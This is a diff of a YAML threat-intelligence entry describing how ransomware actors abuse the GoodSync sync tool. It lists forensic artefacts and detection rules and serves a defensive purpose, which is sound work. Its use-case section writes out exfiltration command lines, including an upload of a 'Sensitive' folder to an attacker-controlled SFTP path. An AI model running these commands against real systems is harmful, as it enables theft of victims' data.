@@ -14,22 +14,22 @@ Execution:
   - gui
   - cli
 Capabilities:
-  - file-synchronization   # Core functionality; syncs files between local and remote destinations.
-  - recursive-upload       # Sync jobs can recursively upload entire directory trees.
-  - cloud-upload           # Supports multiple cloud backends (Backblaze, Google Drive, OneDrive, S3-compatible).
-  - sftp-upload            # Exfiltration via SFTP endpoints controlled by the attacker.
-  - file-filtering         # Include/exclude rules to target specific file types or modified data.
-  - scheduled-execution    # Automated sync jobs that run periodically without user interaction.
-  - quiet-execution        # Sync tasks can run silently with minimal GUI evidence.
-  - background-execution   # Jobs execute in background via GoodSync service/engine.
-  - credential-storage     # Encoded credentials stored in GoodSync TIC configuration files.
-  - persistent-jobs        # Sync jobs persist across reboots via saved TIC job definitions.
+  - file-synchronization
+  - recursive-upload
+  - cloud-upload
+  - sftp-upload
+  - file-filtering
+  - scheduled-execution
+  - quiet-execution
+  - background-execution
+  - credential-storage
+  - persistent-jobs
 Forensics:
   BinaryLocations:
-    - C:\Program Files\GoodSync\GoodSync.exe
-    - C:\Program Files\GoodSync\gsync.exe
-    - /usr/bin/gsync
-    - /usr/local/bin/gsync
+    - "C:\Program Files\GoodSync\GoodSync.exe"
+    - "C:\Program Files\GoodSync\gsync.exe"
+    - "/usr/bin/gsync"
+    - "/usr/local/bin/gsync"
   FileNamePatterns:
     - GoodSync.exe
     - gsync.exe
@@ -37,29 +37,30 @@ Forensics:
   CommandLineArgs:
     Description: Command-line options commonly observed in malicious GoodSync-based exfiltration.
     Indicators:
-      - gsync sync            # CLI-driven sync operation used for silent bulk exfiltration.
-      - /analyse              # Directory scan prior to sync; previews data volume.
-      - /dir                  # Specifies source/target sync job directory.
-      - /exclude              # Skips large or irrelevant files to reduce noise.
-      - /include              # Targets specific formats (.pdf, .docx, .csv).
-      - /oneway               # Enforces local-to-remote uploads only.
-      - /contact              # References predefined remote storage endpoints.
+      - gsync sync
+      - /analyse
+      - /dir
+      - /exclude
+      - /include
+      - /oneway
+      - /contact
   ConfigFiles:
-    - AppData\Local\GoodSync\server-accounts.tic
-    - AppData\Local\GoodSync\GsAcct.tic
-    - AppData\Local\GoodSync\jobs-groups-options-*.tic
-    - AppData\Local\GoodSync\GoogleDriveCache\google-fs-cache.tic
+    - "AppData\Local\GoodSync\server-accounts.tic"
+    - "AppData\Local\GoodSync\GsAcct.tic"
+    - "AppData\Local\GoodSync\jobs-groups-options-*.tic"
+    - "AppData\Local\GoodSync\GoogleDriveCache\google-fs-cache.tic"
   RegistryPersistence:
-    - HKCU\Software\GoodSync
-    - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\GoodSync
+    - "HKCU\Software\GoodSync"
+    - "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\GoodSync"
   LogFiles:
-    - AppData\Local\GoodSync\log\GoodSync-YYYYMMDD-HHmm.log
-NetworkArtifacts:
-  Description: >
-    GoodSync generates outbound connections to cloud storage providers or remote servers
-    defined in sync job configurations. Because destinations depend on user-selected
-    backends (cloud or SFTP), network indicators alone are insufficient for reliable
-    detection without endpoint or configuration context.
+    - "AppData\Local\GoodSync\log\GoodSync-YYYYMMDD-HHmm.log"
+  NetworkArtifacts:
+    Description: >
+      GoodSync generates outbound connections to cloud storage providers or remote servers
+      defined in sync job configurations. Because destinations depend on user-selected
+      backends (cloud or SFTP), network indicators alone are insufficient for reliable
+      detection without endpoint or configuration context.
+    Indicators: []
   ScheduledTask: []
 NetworkBehavior:
   Description: >
@@ -68,54 +69,53 @@ NetworkBehavior:
     upload new or modified files, allowing exfiltration to continue over extended periods while
     appearing similar to legitimate backup activity.
   Behaviors:
-    - Repeated outbound uploads to cloud or SFTP endpoints over HTTPS or SSH
-    - Long-lived background processes executing without user interaction
-    - One-way synchronization patterns with no inbound file activity
-    - Gradual or bulk transfer of large datasets
+    - repeated outbound uploads to cloud or SFTP endpoints
+    - long-lived background processes without user interaction
+    - one-way synchronization with no inbound data
+    - gradual or bulk transfer of large datasets
 ThreatActors:
   - ransomware
 UseCases:
   - Title: Bulk directory exfiltration to cloud storage
     Description: >
       Threat actors configure a GoodSync job targeting cloud storage to recursively upload
-      large volumes of victim data. Observed in Chaos and 3AM ransomware campaigns.
-    Command: gsync sync /dir "C:\Data" /oneway /contact backblaze-profile
+      large volumes of victim data.
+    Command: "gsync sync /dir C:\Data /oneway /contact backblaze-profile"
   - Title: Silent CLI-based exfiltration
     Description: >
-      gsync.exe used instead of the GUI to enable silent, script-driven execution via remote shells.
-    Command: gsync sync /dir "/home/user/Documents" /oneway
+      gsync.exe used instead of the GUI for script-driven execution.
+    Command: "gsync sync /dir /home/user/Documents /oneway"
   - Title: Targeted exfiltration using filters
     Description: >
-      Include/exclude rules restrict uploads to high-value file types to reduce noise.
-    Command: gsync sync /dir "C:\Users\Admin" /include="*.pdf" /exclude="*.iso"
+      Include/exclude rules restrict uploads to high-value file types.
+    Command: "gsync sync /dir C:\Users\Admin /include=*.pdf /exclude=*.iso"
   - Title: SFTP-based exfiltration
     Description: >
-      Sync job uploads data to attacker-controlled SFTP infrastructure, bypassing cloud-specific monitoring.
-    Command: gsync sync /dir "C:\Sensitive" /contact "sftp://192.168.1.10/exfil/"
+      Sync job uploads data to attacker-controlled SFTP infrastructure.
+    Command: "gsync sync /dir C:\Sensitive /contact sftp://192.168.1.10/exfil/"
   - Title: Persistent automated sync job
     Description: >
       Saved GoodSync job continuously exfiltrates newly created or modified files.
-    Command: N/A
+    Command: "N/A"
 Detection:
   - Type: Suspicious Sync Job Creation
     Description: >
-      Detect creation or modification of GoodSync TIC files referencing new cloud or SFTP accounts
-      on systems where GoodSync is uncommon.
+      Detect creation or modification of GoodSync TIC files referencing new cloud or SFTP accounts.
   - Type: CLI Execution from Unusual Parent
     Description: >
       Alert when gsync.exe is spawned by PowerShell, wscript, mshta, psexec, or remote execution tools.
   - Type: Large Outbound Transfers
     Description: >
-      Monitor high-volume uploads to cloud storage services originating from non-backup systems.
+      Monitor high-volume uploads to cloud storage from non-backup systems.
   - Type: Silent Background Sync
     Description: >
-      Detect gsync.exe running without GUI interaction combined with /oneway or filtering flags.
+      Detect gsync.exe running without GUI interaction combined with /oneway flags.
   - Type: Non-Standard SFTP Usage
     Description: >
-      Flag outbound SFTP connections from endpoints not designated for backup or data transfer.
+      Flag outbound SFTP connections from endpoints not designated for backup.
 References:
   - https://blog.talosintelligence.com/new-chaos-ransomware/
   - https://news.sophos.com/en-us/2025/05/20/a-familiar-playbook-with-a-twist-3am-ransomware-actors/
   - https://thehackernews.com/2025/07/chaos-raas-emerges-after-blacksuit.html
   - https://www.synacktiv.com/en/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat
-LastModified: '2025-12-12'
+LastModified: "2025-12-12"
